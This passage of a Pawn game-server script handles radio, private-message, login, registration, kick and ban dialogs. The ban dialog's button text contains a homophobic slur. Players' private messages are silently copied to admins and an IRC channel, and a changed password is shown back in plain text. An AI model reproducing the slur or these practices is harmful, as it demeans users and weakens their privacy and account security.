    					ShowPlayerDialog(playerid, DIALOGID_RADIO, DIALOG_STYLE_LIST, "Radio Control Panel [Main]", "Radio Stations\nCustom Station\nStop Radio\nEnable xAudio\nDisable xAudio", "OK", "Close");
    					return 1;
					}
				}
    			ShowPlayerDialog(playerid, DIALOGID_RADIOCUSTOM, DIALOG_STYLE_INPUT, "Radio Control Panel [Custom Radio]", "ERROR: Invalid file extension.\n\nRadio extensions: .ASX, .PLS\n\n(Single audio files:\nWAV, AIFF, MP3/MP2/MP1, OGG,\nWMA, FLAC, WV, SPX, MPC, AC3,\nAAC, ALAC, TTA, APE and OFR)", "Stream", "Close");
	        } else 	ShowPlayerDialog(playerid, DIALOGID_RADIO, DIALOG_STYLE_LIST, "Radio Control Panel [Main]", "Radio Stations\nCustom Station\nStop Radio\nEnable xAudio\nDisable xAudio", "OK", "Close");
			return 1;
		}
  		case DIALOGID_RETURNBUTTON:
        {
	        if (response) return ShowPlayerDialog(playerid, DIALOGID_RADIO, DIALOG_STYLE_LIST, "Radio Control Panel [Main]", "Radio Stations\nCustom Station\nStop Radio\nEnable xAudio\nDisable xAudio", "OK", "Close");
			else return 0;
		}

		case DIALOGID_RADIO2:
        {
	        if (response)
	        {
	        	switch(listitem)
				{
					case 0:
					{
						new radiolist[450];
						radiolist = ".977 Today's Hits\n.977 Hip Hop/RNB\n.977 Alternative\n.977 90's Hits\n.977 80's Hits\n.977 70's Rock\n.977 Oldies\n.977 Country\n.977 Adult Hits\n.977 Jazz Music\n.977 Comedy\nThe Doo-Wop Express\nHARDSTATION.fm\nFEAR.fm\nHARD.fm\nSKY.fm Top Hits\nSKY.fm Dance Hits\nSKY.fm Urban Jamz\nSKY.fm Classic Rap\nSKY.fm 80's Hits\nSKY.fm 70's Hits\nSKY.fm Oldies\nSKY.fm Reggae\nSKY.fm Classic Rock\nSKY.fm Salsa\nSKY.fm Pop Punk\nSKY.fm Love Music";
						ShowPlayerDialog(playerid, DIALOGID_RADIO2LIST, DIALOG_STYLE_LIST, "Radio Control Panel [Radio List]", radiolist, "OK", "Return");
					}
					case 1:
					{
						ShowPlayerDialog(playerid, DIALOGID_RADIO2CUSTOM, DIALOG_STYLE_INPUT, "Radio Control Panel [Custom Radio]", "Radio extensions: .ASX, .PLS\n\n(Single audio files:\nWAV, AIFF, MP3/MP2/MP1, OGG,\nWMA, FLAC, WV, SPX, MPC, AC3,\nAAC, ALAC, TTA, APE and OFR)", "Play", "Close");
					}
					case 2:
					{
						if (player[playerid][HANDLEID_RADIO] == -1)
						return ShowPlayerDialog(playerid, DIALOGID_RETURNBUTTON2, DIALOG_STYLE_MSGBOX, "Radio Control Panel [Volume]", "ERROR: Changing volume only works if music is playing.", "Return", "Close");

						ShowPlayerDialog(playerid, DIALOGID_RADIO2VOLUME, DIALOG_STYLE_INPUT, "Radio Control Panel [Volume]", "Adjust volume [0-100]:", "OK", "Close");
					}
					case 3:
					{
					    if (player[playerid][HANDLEID_RADIO] != -1)
						Audio_Stop(playerid, player[playerid][HANDLEID_RADIO]);

						player[playerid][HANDLEID_RADIO] = -1;

					}
					case 4:
					{
						if (Audio_IsClientConnected(playerid))
						return ShowPlayerDialog(playerid, DIALOGID_RADIO2, DIALOG_STYLE_MSGBOX, "Radio Control Panel [Connect]", "ERROR: xAudio is already enabled.", "Close", "");

						GetPlayerIp(playerid, playerip, sizeof(playerip));
						GetPlayerName(playerid, playername, sizeof(playername));
						Audio_AddPlayer(playerid, playerip, playername);
					}
					case 5:
					{
						if (!Audio_IsClientConnected(playerid))
						return ShowPlayerDialog(playerid, DIALOGID_RADIO2, DIALOG_STYLE_MSGBOX, "Radio Control Panel [Disconnect]", "ERROR: xAudio is already enabled.", "Close", "");

						Audio_RemovePlayer(playerid);
					}
				}
				return 1;
	        }
			return 0;
		}
        case DIALOGID_RADIO2LIST:
        {
	        if (response)
	        {
	            if (player[playerid][HANDLEID_RADIO] != -1)
	            Audio_Stop(playerid, player[playerid][HANDLEID_RADIO]);

				SendClientMessage(playerid, COLOR_ORANGE, "Radio is buffering, please hold a few seconds.");

	     	    GetPlayerName(playerid, playername, sizeof(playername));
				format(logstring, sizeof(logstring), "%s (%d) streaming.", playername, playerid);
				printflog("RADIO2", logstring);

	            new radiostr[95];
	        	switch(listitem)
				{
					case 0: radiostr = "http://www.977music.com/tunein/web/hitz3.asx";
					case 1: radiostr = "http://www.977music.com/tunein/web/jamz3.asx";
					case 2: radiostr = "http://www.977music.com/tunein/web/alternative3.asx";
					case 3: radiostr = "http://www.977music.com/tunein/web/90s3.asx";
					case 4: radiostr = "http://www.977music.com/tunein/web/80s3.asx";
					case 5: radiostr = "http://www.977music.com/tunein/web/classicrock3.asx";
					case 6: radiostr = "http://www.977music.com/tunein/web/oldies3.asx";
					case 7: radiostr = "http://www.977music.com/tunein/web/country3.asx";
					case 8: radiostr = "http://www.977music.com/tunein/web/mix3.asx";
					case 9: radiostr = "http://www.977music.com/tunein/web/smoothjazz3.asx";
					case 10: radiostr = "http://www.977music.com/tunein/web/comedy3.asx";
					case 11: radiostr = "http://loudcity.com/player/the-doo-wop-express/asx.asx?cache_bust=1319842983&max_bitrate=56";
					case 12: radiostr = "http://www.hardstation.fm/content/streamfiles/listen.asx";
					case 13: radiostr = "http://www.fear.fm/streamrelay/playlist/harder.asx";
					case 14: radiostr = "http://files.hard.fm/listen.asx";
					case 15: radiostr = "http://listen.sky.fm/public5/tophits.asx";
					case 16: radiostr = "http://listen.sky.fm/public5/dancehits.asx";
					case 17: radiostr = "http://listen.sky.fm/public5/urbanjamz.asx";
					case 18: radiostr = "http://listen.sky.fm/public5/classicrap.asx";
					case 19: radiostr = "http://listen.sky.fm/public5/the80s.asx";
					case 20: radiostr = "http://listen.sky.fm/public5/hit70s.asx";
					case 21: radiostr = "http://listen.sky.fm/public5/oldies.asx";
					case 22: radiostr = "http://listen.sky.fm/public5/rootsreggae.asx";
					case 23: radiostr = "http://listen.sky.fm/public5/classicrock.asx";
					case 24: radiostr = "http://listen.sky.fm/public5/salsa.asx";
					case 25: radiostr = "http://listen.sky.fm/public5/poppunk.asx";
					case 26: radiostr = "http://listen.sky.fm/public5/lovemusic.asx";
				}
				player[playerid][HANDLEID_RADIO] = Audio_PlayStreamed(playerid, radiostr);
				new radiolist[450];
				radiolist = ".977 Today's Hits\n.977 Hip Hop/RNB\n.977 Alternative\n.977 90's Hits\n.977 80's Hits\n.977 70's Rock\n.977 Oldies\n.977 Country\n.977 Adult Hits\n.977 Jazz Music\n.977 Comedy\nThe Doo-Wop Express\nHARDSTATION.fm\nFEAR.fm\nHARD.fm\nSKY.fm Top Hits\nSKY.fm Dance Hits\nSKY.fm Urban Jamz\nSKY.fm Classic Rap\nSKY.fm 80's Hits\nSKY.fm 70's Hits\nSKY.fm Oldies\nSKY.fm Reggae\nSKY.fm Classic Rock\nSKY.fm Salsa\nSKY.fm Pop Punk\nSKY.fm Love Music";
				ShowPlayerDialog(playerid, DIALOGID_RADIO2LIST, DIALOG_STYLE_LIST, "Radio Control Panel [Radio List]", radiolist, "OK", "Return");
	        } else ShowPlayerDialog(playerid, DIALOGID_RADIO2, DIALOG_STYLE_LIST, "Radio Control Panel [Main]", "Radio Stations\nCustom Station\nChange Volume\nStop Radio\nEnable xAudio [20 sec delay after disconnect]\nDisable xAudio", "OK", "Close");
			return 1;
		}
        case DIALOGID_RADIO2CUSTOM:
        {
	        if (response)
	        {
				if (!strlen(inputtext))
    			return ShowPlayerDialog(playerid, DIALOGID_RADIO2CUSTOM, DIALOG_STYLE_INPUT, "Radio Control Panel [Custom Radio]", "ERROR: Invalid file extension.\n\nRadio extensions: .ASX, .PLS\n\n(Single audio files:\nWAV, AIFF, MP3/MP2/MP1, OGG,\nWMA, FLAC, WV, SPX, MPC, AC3,\nAAC, ALAC, TTA, APE and OFR)", "Stream", "Close");

	       	    for (new i = 0; i < 19; i++)
			    {
					if (strfind(inputtext, AudioFiles[i], true) != -1)
					{
						if (player[playerid][HANDLEID_RADIO] != -1)
			            Audio_Stop(playerid, player[playerid][HANDLEID_RADIO]);

						SendClientMessage(playerid, COLOR_ORANGE, "Radio is buffering, please hold a few seconds.");

					    GetPlayerName(playerid, playername, sizeof(playername));
						format(logstring, sizeof(logstring), "%s (%d) stream: %s", playername, playerid, inputtext);
						printflog("RADIO2-C", logstring);

						player[playerid][HANDLEID_RADIO] = Audio_PlayStreamed(playerid, inputtext);
    					ShowPlayerDialog(playerid, DIALOGID_RADIO2, DIALOG_STYLE_LIST, "Radio Control Panel [Main]", "Radio Stations\nCustom Station\nChange Volume\nStop Radio\nEnable xAudio [20 sec delay after disconnect]\nDisable xAudio", "OK", "Close");
    					return 1;
					}
				}
    			ShowPlayerDialog(playerid, DIALOGID_RADIO2CUSTOM, DIALOG_STYLE_INPUT, "Radio Control Panel [Custom Radio]", "ERROR: Invalid file extension.\n\nRadio extensions: .ASX, .PLS\n\n(Single audio files:\nWAV, AIFF, MP3/MP2/MP1, OGG,\nWMA, FLAC, WV, SPX, MPC, AC3,\nAAC, ALAC, TTA, APE and OFR)", "Stream", "Close");
	        } else ShowPlayerDialog(playerid, DIALOGID_RADIO2, DIALOG_STYLE_LIST, "Radio Control Panel [Main]", "Radio Stations\nCustom Station\nChange Volume\nStop Radio\nEnable xAudio [20 sec delay after disconnect]\nDisable xAudio", "OK", "Close");
			return 1;
		}
  		case DIALOGID_RADIO2VOLUME:
        {
	        if (response)
	        {
	            new volume = strval(inputtext);
				if (!strlen(inputtext) || volume < 0 || volume > 100)
    			return ShowPlayerDialog(playerid, DIALOGID_RADIO2VOLUME, DIALOG_STYLE_INPUT, "Radio Control Panel [Radio Volume]", "ERROR: Volume must be between 0 and 100.\n\nAdjust volume [0-100]:", "OK", "Close");

				GetPlayerName(playerid, playername, sizeof(playername));
				format(logstring, sizeof(logstring), "%s (%d) volume: %d", playername, playerid, volume);
				printflog("RADIO2-V", logstring);

				Audio_SetVolume(playerid, player[playerid][HANDLEID_RADIO], volume);
	        }
			ShowPlayerDialog(playerid, DIALOGID_RADIO2, DIALOG_STYLE_LIST, "Radio Control Panel [Main]", "Radio Stations\nCustom Station\nChange Volume\nStop Radio\nEnable xAudio [20 sec delay after disconnect]\nDisable xAudio", "OK", "Close");
			return 1;
		}
  		case DIALOGID_RETURNBUTTON2:
        {
	        if (response) return ShowPlayerDialog(playerid, DIALOGID_RADIO2, DIALOG_STYLE_LIST, "Radio Control Panel [Main]", "Radio Stations\nCustom Station\nChange Volume\nStop Radio\nEnable xAudio [20 sec delay after disconnect]\nDisable xAudio", "OK", "Close");
			else return 0;
		}
		
		case DIALOGID_SENDPM:
		{
  			if (response)
	        {
				//SpamProtection(playerid, "PM");

				if (player[playerid][clickedplayer] == playerid)
			    {
					ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "You cannot PM yourself.", "OK", "Cancel");
			    	player[playerid][clickedplayer] = -1;
					return 0;
				}

				if (!IsPlayerConnected(player[playerid][clickedplayer]) || player[playerid][clickedplayer] == INVALID_PLAYER_ID)
				{
					ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "The selected player is not connected (anymore).", "OK", "Cancel");
					player[playerid][clickedplayer] = -1;
					return 0;
				}

				if (!strlen(inputtext))
				return ShowPlayerDialog(playerid, DIALOGID_SENDPM, DIALOG_STYLE_INPUT, "Private Message", "Enter your message you want to send below:", "Send", "Cancel");

  				if (player[playerid][disablepm] == 1)
				return SendErrorMessage(playerid, EMBED_WHITE, "You cannot send Private Messages if you don't want to receive them.");

				if (player[ player[playerid][clickedplayer] ][disablepm] == 1)
				return SendErrorMessage(playerid, EMBED_WHITE, "This player does not want to receive Private Messages.");

				GetPlayerName(playerid, playername, sizeof(playername));
				GetPlayerName(player[playerid][clickedplayer], giveplayername, sizeof(giveplayername));

				new PMmsg[128];
		   		format(PMmsg, sizeof(PMmsg), "-> [PM] %s: %s", giveplayername, inputtext);
			    SendClientMessage(playerid, 0xFFCC2299, PMmsg);

		   		format(PMmsg, sizeof(PMmsg), "<- [PM] %s: %s", playername, inputtext);
			    SendClientMessage(player[playerid][clickedplayer], 0xFFCC2299, PMmsg);

		   		format(PMmsg, sizeof(PMmsg), "[PM] %s -> %s: %s", playername, giveplayername, inputtext);
				IRC_GroupSay(1, IRCOP_CHANNEL, PMmsg);

				player[playerid][lastpm] = player[playerid][clickedplayer];
				player[ player[playerid][clickedplayer] ][lastpm] = playerid;

				for (new a = 0; a < MAX_PLAYERS; a++)
				{
				    if (IsPlayerConnected(a) && player[a][ADMIN] >= 3)
				    {
				    	if (a == playerid || a == player[playerid][clickedplayer])
						continue;

						SendClientMessage(a, COLOR_BROWN, PMmsg);
					}
				}
				printflog("ADM-MSG", PMmsg);

				player[playerid][clickedplayer] = -1;
				return 1;
	        } else {
				player[playerid][clickedplayer] = -1;
				return 0;
			}
		}

		case DIALOGID_LOGIN:
		{
			if (response)
	        {
				if (mysqloffline)
				return ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "Could not initialize database. (Code #1)", "Close", "");
	        
			    if (player[playerid][logged] == 1)
				return ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "You are already logged in.", "Close", "");

			    if (!IsPlayerRegistered(playerid))
				return ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "Your account cannot be found in our database. Please register if so.", "Close", "");

				if (!strlen(inputtext) || strlen(inputtext) < 5 || strlen(inputtext) > 30)
				return ShowPlayerDialog(playerid, DIALOGID_LOGIN, DIALOG_STYLE_PASSWORD, ""EMBED_RED"Error", "Incorrect password for Secured Account.\nPlease enter your password below:", "Login", "Cancel");
			 	
			    new password[129],
					mysqlStr[350];
			    WP_Hash(password, sizeof(password), inputtext);
			    format(mysqlStr, sizeof(mysqlStr), "SELECT * FROM accounts, player_logs, preferences WHERE accounts.account_id = %d AND accounts.account_password = '%s' AND player_logs.account_id = %d AND preferences.account_id = %d LIMIT 1", GetPlayerAccountID(playerid), password, GetPlayerAccountID(playerid), GetPlayerAccountID(playerid));
				mysql_run_query(mysqlConnection, mysqlStr, true, "QS_ManualPlayerLogin", "ii", playerid, player[playerid][cinc]);
			    return 1;
			} else {
				GetPlayerName(playerid, playername, sizeof(playername));

	 			format(strings, sizeof(strings), "Kicked %s. (Reason: Failed to login in Secured account [Code #3])", playername);
				SendServerMessageToAll(EMBED_RED, strings);
				printflog("KICK-A", strings);
				format(tmps2, sizeof(tmps2), "8,1%s", strings);
				IRC_GroupSay(1, IRC_CHANNEL, tmps2);
				KickEx(playerid);

				new mysqlStr[130];
		        format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_PLAYER_LOGS" SET `player_log_kick_count` = player_log_kick_count +1 WHERE `account_id` = %d LIMIT 1", GetPlayerAccountID(playerid));
	      		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");
			}
			return 0;
		}
		case DIALOGID_REGISTER:
		{
		    if (response)
		    {
				if (mysqloffline)
				return ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "Could not initialize database. (Code #1)", "Close", "");

				if (strlen(inputtext) < 5 || strlen(inputtext) > 30)
				return ShowPlayerDialog(playerid, DIALOGID_REGISTER, DIALOG_STYLE_INPUT, ""EMBED_RED"Error", "Password length must be between 5-30 characters:", "Set", "");

			    new password[129];

			    WP_Hash(password, sizeof(password), inputtext);
				CreatePlayerAccount(playerid, inputtext, password);
				ShowPlayerDialog(playerid, DIALOGID_SETMAIL, DIALOG_STYLE_INPUT, "xMovie Server", "Step 2 of 2.\n\nIf you would like to receive:\n- news;\n- updates;\n- ability to retrieve lost password.\nplease enter your email adress below.\n\nIf you do not wish to receive any, leave BLANK and skip this step.\n\n"EMBED_IVORY"*We do NOT distribute personal info to third parties.", "Set", "Cancel");

				//mysql_run_query(mysqlConnection, "INSERT INTO "MYSQL_TABLE_SERVER_STATISTICS" (server_statistic_date, server_statistic_accounts_registered) VALUES (CURDATE(), 1) ON DUPLICATE KEY UPDATE `server_statistic_id` = LAST_INSERT_ID(server_statistic_id), `server_statistic_accounts_registered` = server_statistic_accounts_registered +1", false, "", "");
			}
			return 1;
		}
		case DIALOGID_SETMAIL:
		{
		    if (response)
		    {
				if (mysqloffline)
				return ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "Could not initialize database. (Code #1)", "Close", "");

			    if (player[playerid][logged] == 0)
				return ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "You are currently not logged in.", "Close", "");

	  			if (player[playerid][clogged] == 1)
				return ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "Clones cannot change email of their accounts.", "OK", "");

				if (!IsPlayerRegistered(playerid))
				return ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "Your account cannot be found in the database.", "Close", "");

				new mysqlStr[147],
					newemail[40];
					
				if (sscanf(inputtext, "s[40] ", newemail))
				{
					format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_PREFERENCES" SET `preference_email` = '' WHERE `account_id` = %d LIMIT 1", GetPlayerAccountID(playerid));
					mysql_run_query(mysqlConnection, mysqlStr, false, "", "");

		    		format(strings, sizeof(strings), "* Your email address has been discarded, you will no longer receive:\n- news;\n- updates;\n- ability to retrieve lost password.\n\n"EMBED_IVORY"*We do NOT distribute personal info to third parties.\n\nYou have succesfully registered!", inputtext);
					ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, "Success", strings, "Close", "");

				    GetPlayerName(playerid, playername, sizeof(playername));
					format(logstring, sizeof(logstring), "%s (id: %d) has discarded his email address.", playername, playerid);
					printflog("SETEMAIL", logstring);
					SendServerMessageToAdmins(EMBED_BROWN, logstring, 5);
					IRC_GroupSay(1, IRCSOP_CHANNEL, logstring);
				} else {
					if (strlen(inputtext) > 40 || !IsValidEmail(newemail))
					return ShowPlayerDialog(playerid, DIALOGID_SETMAIL, DIALOG_STYLE_MSGBOX, ""EMBED_RED"", "If you would like to receive:\n- news;\n- updates;\n- ability to retrieve lost password.\nplease enter your email adress below.\n\nIf you do not wish to receive any, leave BLANK and skip this step.\n\n"EMBED_IVORY"*We do NOT distribute personal info to third parties.\n\n"EMBED_RED"Your email address is too long.", "Set", "Cancel");
					
					mysql_real_escape_string(newemail, newemail);
					format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_PREFERENCES" SET `preference_email` = '%s' WHERE `account_id` = %d LIMIT 1", newemail, GetPlayerAccountID(playerid));
					mysql_run_query(mysqlConnection, mysqlStr, false, "", "");

		    		format(strings, sizeof(strings), "* Your email address has been changed to \"%s\".\n\nYou have succesfully registered!", inputtext);
					ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, "Success", strings, "Close", "");

				    GetPlayerName(playerid, playername, sizeof(playername));
					format(logstring, sizeof(logstring), "%s (id: %d) has changed his email address to %s.", playername, playerid, newemail);
					printflog("SETEMAIL", logstring);
					SendServerMessageToAdmins(EMBED_BROWN, logstring, 5);
					IRC_GroupSay(1, IRCSOP_CHANNEL, logstring);
				}
			}
			return 1;
		}
		case DIALOGID_SETPASS:
		{
		    if (response)
		    {
				if (mysqloffline)
				return ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "Could not initialize database. (Code #1)", "Close", "");

			    if (player[playerid][logged] == 0)
				return ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "You are currently not logged in.", "Close", "");

	  			if (player[playerid][clogged] == 1)
				return ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "Clones cannot change password of their accounts.", "OK", "");

				if (!IsPlayerRegistered(playerid))
				return ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "Your account cannot be found in the database.", "Close", "");

				if (strlen(inputtext) < 5 || strlen(inputtext) > 30)
				return ShowPlayerDialog(playerid, DIALOGID_SETPASS, DIALOG_STYLE_INPUT, ""EMBED_RED"Error", "Password length must be between 5-30 characters:", "Change", "");
				
				new mysqlStr[231],
					newpassword[129];

			    WP_Hash(newpassword, sizeof(newpassword), inputtext);
				format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_ACCOUNTS" SET `account_password` = '%s' WHERE `account_id` = %d LIMIT 1", newpassword, GetPlayerAccountID(playerid));
				mysql_run_query(mysqlConnection, mysqlStr, false, "", "");

	    		format(strings, sizeof(strings), "* Your password has been changed to \"%s\" , don't forget it!", inputtext);
				ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, "Success", strings, "Close", "");
				
			    GetPlayerName(playerid, playername, sizeof(playername));
				format(logstring, sizeof(logstring), "%s (id: %d) has changed his password.", playername, playerid);
				printflog("SETPASS", logstring);
				SendServerMessageToAdmins(EMBED_BROWN, logstring, 5);
				IRC_GroupSay(1, IRCSOP_CHANNEL, logstring);
			}
			return 1;
		}
		
		case DIALOGID_KICK:
		{
  			if (!IsPlayerAdminLevel(playerid, 2))
  			{
				ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "This command is inaccessible for your level.", "OK", "Cancel");
				player[playerid][clickedplayer] = -1;
				return 0;
			}

  			if (response)
	        {
				if (!IsPlayerConnected(player[playerid][clickedplayer]) || player[playerid][clickedplayer] == INVALID_PLAYER_ID)
				{
					ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "The selected player is not connected (anymore).", "OK", "Cancel");
					player[playerid][clickedplayer] = -1;
					return 0;
				}

				if (player[playerid][ADMIN] < player[ player[playerid][clickedplayer] ][ADMIN])
				{
					ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "The selected player has higher priveleges than you. Action cancelled.", "OK", "Cancel");
					player[playerid][clickedplayer] = -1;
					return 0;
				}

				/*if (!strlen(inputtext))
				return ShowPlayerDialog(playerid, DIALOGID_KICK, DIALOG_STYLE_INPUT, "Kick", "Reason:", "Kick", "Cancel");*/

			    if (!player[player[playerid][clickedplayer]][RULEStextdraw])
				{
					TextDrawShowForPlayer(player[playerid][clickedplayer], nrules);
					player[player[playerid][clickedplayer]][RULEStextdraw] = 1;
			    }

				GetPlayerName(playerid, playername, sizeof(playername));
				GetPlayerName(player[playerid][clickedplayer], giveplayername, sizeof(giveplayername));

				if (player[playerid][hideadmin] == 1)
				{
		  			if (!strlen(inputtext))
				    {
    					if (!IsPlayerAdminLevel(playerid, 4))
    					{
							ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "Enter a valid reason.", "OK", "Cancel");
							player[playerid][clickedplayer] = -1;
							return 0;
						}

			  			if (IsVIP( player[playerid][clickedplayer] ) && !IsAdmin( player[playerid][clickedplayer] )) format(tmps1, sizeof(tmps1), "VIP %s (id: %d) has been kicked from the server.", giveplayername, player[playerid][clickedplayer]);
						else if (IsAdmin( player[playerid][clickedplayer] )) format(tmps1, sizeof(tmps1), "Admin %s (id: %d) has been kicked from the server.", giveplayername, player[playerid][clickedplayer]);
						else format(tmps1, sizeof(tmps1), "%s (id: %d) has been kicked from the server.", giveplayername, player[playerid][clickedplayer]);
					} else {
			  			if (IsVIP( player[playerid][clickedplayer] ) && !IsAdmin( player[playerid][clickedplayer] )) format(tmps1, sizeof(tmps1), "VIP %s (id: %d) has been kicked from the server. (Reason: %s)", giveplayername, player[playerid][clickedplayer], inputtext);
						else if (IsAdmin( player[playerid][clickedplayer] )) format(tmps1, sizeof(tmps1), "Admin %s (id: %d) has been kicked from the server. (Reason: %s)", giveplayername, player[playerid][clickedplayer], inputtext);
						else format(tmps1, sizeof(tmps1), "%s (id: %d) has been kicked from the server. (Reason: %s)", giveplayername, player[playerid][clickedplayer], inputtext);
					}

					SendServerMessageToAll(EMBED_RED, tmps1);
					format(ircstring, sizeof(ircstring), "by %s", playername);
					SendMessageToAdmins(COLOR_RED, ircstring, 4);
					format(ircstring, sizeof(ircstring), "8,1%s by %s", tmps1, playername);
					IRC_GroupSay(1, IRCOP_CHANNEL, ircstring);
					printflog("ADM-MSG", ircstring);
				} else {
		  			if (!strlen(inputtext))
				    {
    					if (!IsPlayerAdminLevel(playerid, 4))
    					{
							ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "Enter a valid reason.", "OK", "Cancel");
							player[playerid][clickedplayer] = -1;
							return 0;
						}

			  			if (IsVIP( player[playerid][clickedplayer] ) && !IsAdmin( player[playerid][clickedplayer] )) format(strings, sizeof(strings), "Admin %s kicked VIP %s (id: %d) from the server.", playername, giveplayername, player[playerid][clickedplayer]);
						else if (IsAdmin( player[playerid][clickedplayer] )) format(strings, sizeof(strings), "Admin %s kicked admin %s (id: %d) from the server.", playername, giveplayername, player[playerid][clickedplayer]);
						else format(strings, sizeof(strings), "Admin %s kicked %s (id: %d) from the server.", playername, giveplayername, player[playerid][clickedplayer]);
					} else {
			  			if (IsVIP( player[playerid][clickedplayer] ) && !IsAdmin( player[playerid][clickedplayer] )) format(strings, sizeof(strings), "Admin %s kicked VIP %s (id: %d) from the server (Reason: %s).", playername, giveplayername, player[playerid][clickedplayer], inputtext);
						else if (IsAdmin( player[playerid][clickedplayer] )) format(strings, sizeof(strings), "Admin %s kicked admin %s (id: %d) from the server (Reason: %s).", playername, giveplayername, player[playerid][clickedplayer], inputtext);
						else format(strings, sizeof(strings), "Admin %s kicked %s (id: %d) from the server (Reason: %s).", playername, giveplayername, player[playerid][clickedplayer], inputtext);
					}

					SendServerMessageToAll(EMBED_RED, strings);
					printflog("ADM-MSG", strings);
					format(tmps2, sizeof(tmps2), "8,1%s", strings);
					IRC_GroupSay(1, IRC_CHANNEL, tmps2);
				}

				if (IsPlayerRegistered(player[playerid][clickedplayer]) && IsPlayerLoggedIn(player[playerid][clickedplayer]))
				{
					new mysqlStr[180];
					format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_PLAYER_LOGS" SET `player_log_kick_count` = player_log_kick_count +1, `player_log_warn_count` = player_log_warn_count +1 WHERE account_id = %d LIMIT 1", GetPlayerAccountID(player[playerid][clickedplayer]));
					mysql_run_query(mysqlConnection, mysqlStr, false, "", "");
				}

				KickEx(player[playerid][clickedplayer]);
				SendCommandMessageToAdmins(playerid, "kick (M)");

				player[playerid][clickedplayer] = -1;
				return 1;
	        } else {
				player[playerid][clickedplayer] = -1;
				return 0;
			}
		}

		case DIALOGID_BAN:
		{
			if (!IsPlayerAdminLevel(playerid, 3))
  			{
				ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "This command is inaccessible for your level.", "OK", "Cancel");
				player[playerid][clickedplayer] = -1;
				return 0;
			}

  			if (response)
	        {
				if (player[playerid][clickedplayer] == playerid)
			    {
					ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "You cannot ban yourself.", "OK", "Cancel");
			    	player[playerid][clickedplayer] = -1;
					return 0;
				}

				if (!IsPlayerConnected(player[playerid][clickedplayer]) || player[playerid][clickedplayer] == INVALID_PLAYER_ID)
				{
					ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "The selected player is not connected (anymore).", "OK", "Cancel");
					player[playerid][clickedplayer] = -1;
					return 0;
				}

				if (player[playerid][ADMIN] < player[ player[playerid][clickedplayer] ][ADMIN])
				{
					ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "The selected player has higher priveleges than you. Action cancelled.", "OK", "Cancel");
					player[playerid][clickedplayer] = -1;
					return 0;
				}

				if (!strlen(inputtext))
				return ShowPlayerDialog(playerid, DIALOGID_BAN, DIALOG_STYLE_INPUT, "Ban", "Reason:", "Ban this faggot", "Cancel");

			    if (!player[player[playerid][clickedplayer]][RULEStextdraw])
				{
					TextDrawShowForPlayer(player[playerid][clickedplayer], nrules);
					player[player[playerid][clickedplayer]][RULEStextdraw] = 1;
			    }

				GetPlayerName(playerid, playername, sizeof(playername));
				GetPlayerName(player[playerid][clickedplayer], giveplayername, sizeof(giveplayername));

				if (player[playerid][hideadmin] == 1)
				{
					if (!strlen(inputtext))
					{
						if (!IsPlayerAdminLevel(playerid, 5))
    					{
							ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, ""EMBED_RED"Error", "Enter a valid reason.", "OK", "Cancel");
							player[playerid][clickedplayer] = -1;
							return 0;
						}

